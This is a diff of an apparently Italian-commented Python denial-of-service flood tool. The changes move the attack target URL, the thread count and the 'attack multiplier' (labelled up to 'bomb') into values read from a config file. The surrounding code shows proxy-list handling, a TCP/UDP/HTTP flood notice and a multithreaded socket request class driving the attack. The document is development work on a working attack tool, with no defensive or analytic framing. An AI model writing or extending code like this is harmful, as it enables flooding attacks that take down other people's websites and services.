@@ -34,6 +34,10 @@ except: # altrimenti, se fallisce l'importazione
 	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # printa questo
                                                                                         
 FIFTEEN_MINUTES = 900
+url = open("config.txt","r").readlines()		
+URL_TARGET = url[0]
+THREADS_ = int(url[1])
+MULTIPLE_ = int(url[2])
 
 @on_exception(expo, RateLimitException, max_tries=800)
 @limits(calls=150, period=FIFTEEN_MINUTES)
@@ -1213,12 +1217,11 @@ def proxylist():
 
 def numthreads():
 	global threads
-	config = open("config.txt","r").readlines()
 	try:
-		# threads = int(input("Insert number of threads (800): "))		
-		threads = config[1]
+		# threads = int(input("Insert number of threads (800): "))
+		threads = THREADS_
 	except ValueError:
-		threads = int(config[1])
+		threads = int(THREADS_)
 		print ("800 threads selected.\n")
 	multiplication()
 
@@ -1226,8 +1229,7 @@ def multiplication():
 	global multiple
 	try:
 		# multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
-		config = open("config.txt","r").readlines()	
-		multiple = int(config[2])
+		multiple = int(MULTIPLE_)
 	except ValueError:
 		print("You mistyped, try again.\n")
 		multiplication()
@@ -1624,7 +1626,5 @@ class RequestDefaultHTTP(threading.Thread): # la classe del multithreading
 					s.close()
 			except: # se qualcosa va storto
 				s.close() # chiude socket e ricomincia
-if __name__ == '__main__':
-	config = open("config.txt","r").readlines()	
-	URL_TARGET = config[0]
+if __name__ == '__main__':	
 	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.                                                    
